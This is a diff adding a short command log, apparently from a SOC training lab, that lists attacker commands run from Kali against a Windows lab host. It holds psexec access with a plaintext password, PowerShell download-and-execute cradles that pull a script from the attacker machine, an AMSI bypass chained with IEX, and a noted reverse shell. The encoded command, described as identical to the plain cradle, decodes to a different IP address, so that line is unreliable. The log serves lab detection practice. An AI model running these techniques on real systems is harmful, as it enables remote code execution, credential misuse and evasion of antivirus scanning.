@@ -1,0 +1,30 @@
+# Kali commands — SOC-Case-Suspicious-PowerShell (192.168.100.106 -> 192.168.100.108)
+# Actual commands run.
+
+# Host payload (benign beacon check-in)
+mkdir ~/www && cd ~/www
+cat > payload.ps1 <<'EOF'
+Write-Host "[+] beacon check-in OK"
+whoami
+hostname
+Get-Date
+EOF
+python3 -m http.server 80
+# Log: 192.168.100.108 - - [28/Oct/2026 07:50:56] "GET /payload.ps1 HTTP/1.1" 200 -
+
+# Foothold: SYSTEM shell via psexec (adminlab creds from Case 2)
+impacket-psexec adminlab:'P@ssw0rd'@192.168.100.108
+
+# --- inside psexec shell (C:\Windows\system32>) ---
+
+# 1. IEX download cradle
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')"
+# -> [+] beacon check-in OK
+
+# 2. Encoded command (base64 of same IEX cradle) — T1027
+powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMQA2ADYALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
+
+# 3. AMSI bypass + IEX — T1562.001
+powershell.exe -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')"
+
+# (observed in telemetry: C:\Users\bryll\Downloads\free.exe -> 192.168.100.106:4444 reverse shell)
